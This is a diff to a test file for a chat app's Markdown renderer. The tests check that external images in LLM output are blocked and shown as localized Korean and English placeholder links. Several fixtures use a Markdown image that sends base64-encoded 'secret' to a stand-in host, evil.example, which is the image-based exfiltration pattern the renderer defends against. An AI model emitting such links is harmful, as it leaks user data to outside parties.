@@ -20,6 +20,7 @@ import {
   urlTransform,
 } from '../src/lib/markdownOptions.ts';
 import { normalizeMathDelimiters } from '../src/lib/mathDelimiters.ts';
+import { setLang } from '../src/i18n/index.ts';
 
 function render(markdown: string): string {
   return renderToStaticMarkup(
@@ -233,11 +234,28 @@ describe('images in LLM Markdown', () => {
     const html = render('요약 ![x](https://evil.example/c?d=c2VjcmV0) 끝');
     assert.doesNotMatch(html, /<img/);
     assert.doesNotMatch(html, /rel="preload"/);
-    assert.match(html, /<a href="https:\/\/evil.example\/c\?d=c2VjcmV0" class="md-blocked-image"[^>]*>x \(evil.example\)<\/a>/);
+    // The parse holds no text of any language: the stand-in is filled in by the component when it renders.
+    assert.match(html, /<a href="https:\/\/evil.example\/c\?d=c2VjcmV0" class="md-blocked-image" data-image-alt="x"><\/a>/);
     // The app's component starts the link with an image icon (an SVG, not an emoji in the text).
     const shown = renderComponent('요약 ![x](https://evil.example/c?d=c2VjcmV0) 끝');
     assert.match(shown, /<a [^>]*class="md-blocked-image"[^>]*><svg [^>]*class="lucide lucide-image[^"]*"[^>]*>.*?<\/svg> x \(evil.example\)<\/a>/);
+    assert.doesNotMatch(shown, /data-image-alt/);
     assert.doesNotMatch(renderComponent('[문서](https://example.com/doc)'), /<svg/, 'an ordinary link has no icon');
+  });
+
+  test("a stand-in without alt text says so in the current language; one without a URL is plain text", () => {
+    try {
+      const ko = renderComponent('![](https://evil.example/p.png)');
+      assert.match(ko, /title="외부 이미지는 자동으로 불러오지 않아요 — 클릭하면 새 탭에서 열려요: https:\/\/evil.example\/p.png"/);
+      assert.match(ko, /<\/svg> 외부 이미지 \(evil.example\)<\/a>/);
+      setLang('en');
+      const en = renderComponent('![](https://evil.example/p.png)');
+      assert.match(en, /title="External images aren&#x27;t loaded automatically — click to open in a new tab: https:\/\/evil.example\/p.png"/);
+      assert.match(en, /<\/svg> External image \(evil.example\)<\/a>/);
+      assert.match(renderComponent('![logo](ftp://x.example/l.png)'), /<span class="md-blocked-image">logo<\/span>/);
+    } finally {
+      setLang('system');
+    }
   });
 
   test('protocol-relative, other-path, relative and script sources are refused', () => {
